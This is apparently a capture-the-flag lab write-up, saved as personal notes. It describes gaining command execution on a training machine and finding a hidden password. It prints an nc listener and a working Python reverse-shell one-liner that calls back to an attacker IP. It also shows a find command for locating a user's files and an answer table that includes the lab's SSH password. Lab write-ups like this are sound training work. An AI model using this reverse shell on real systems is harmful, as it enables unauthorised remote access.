It seems we have gained the ability to run commands! Since this is my old PC, I should still have a user account! Let's run a few test commands, and then try to gain access!

**Method 1: nc Reverse shell:**  

This machine has been outfitted with nc, a tool that allows you to make and receive connections and send data. It is one of the most popular tools to get a reverse shell. Some great places to find reverse shell payloads are [highoncoffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/) and [Pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

*Using Python shell:*

On host machine:
```
nc -v -n -l -p 1234
```


On target machine:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.194.147",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```


![[Pasted image 20240327185629.png]]


![[Pasted image 20240327185708.png]]


After this you will have to do some additional enumeration to find pingu's ssh key, or hidden password  

**Method 2: Hidden passwords:**  

Assuming my father hasn't modified since he took over my old PC, I should still have my hidden password stored somewhere,I don't recall though so you'll have to find it! `find` is the recommended tool here as it allows you to search for which files a user specifically owns.

![[Pasted image 20240327191424.png]]

![[Pasted image 20240327191919.png]]

```
find / -user "www-data" -name "*" 2>/dev/null
```
![[Pasted image 20240327191845.png]]

![[Pasted image 20240327192146.png]]



Answer the questions below

| Question                                     | Answer | SS                                   |
| -------------------------------------------- | ------ | ------------------------------------ |
| How many files are in the current directory? | 3      | ![[Pasted image 20240327193450.png]] |

| Question                   | Answer | SS                                   |
| -------------------------- | ------ | ------------------------------------ |
| Do I still have an account | yes    | ![[Pasted image 20240327193632.png]] |

| Question                 | Answer      | SS                                   |
| ------------------------ | ----------- | ------------------------------------ |
| What is my ssh password? | pinguapingu | ![[Pasted image 20240327193732.png]] |
